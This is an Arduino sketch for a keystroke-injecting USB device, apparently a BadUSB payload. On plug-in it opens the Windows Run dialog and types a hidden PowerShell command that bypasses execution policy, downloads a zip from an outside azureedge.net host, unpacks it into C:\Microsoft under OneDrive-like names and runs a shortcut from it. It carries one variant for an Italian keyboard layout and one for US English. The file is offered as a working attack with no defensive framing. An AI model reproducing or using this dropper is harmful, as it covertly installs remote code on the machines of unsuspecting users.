#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // Downoad and execute script in case of Italian keyboard
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("powershell /Exec Bypass /windowStyle hidden md @C>`Microsoft@ < iwr @https>&&azureedge.net&drive.zip@ /outfile @C>`Microsoft`onedrive.zip@ < Expand/Archive /Path @C>`Microsoft`onedrive.zip@ /Dest @C>&Microsoft&< ^ C>`Microsoft`drive.lnk"));

  delay(10);
  typeKey(KEY_RETURN);

    // Downoad and execute script in case of English-US keyboard
    // wait 7 sec
  delay(7000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("powershell -Exec Bypass -windowStyle hidden md \"C:\\Microsoft\" ; iwr \"https://azureedge.net/drive.zip\" -outfile \"C:\\Microsoft\\onedrive.zip\" ; Expand-Archive -Pat \"C:\\Microsoft\\onedrive.zip\" -d \"C:\\Microsoft\\; & C:\\Microsoft\\drive.lnk"));

  delay(10);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
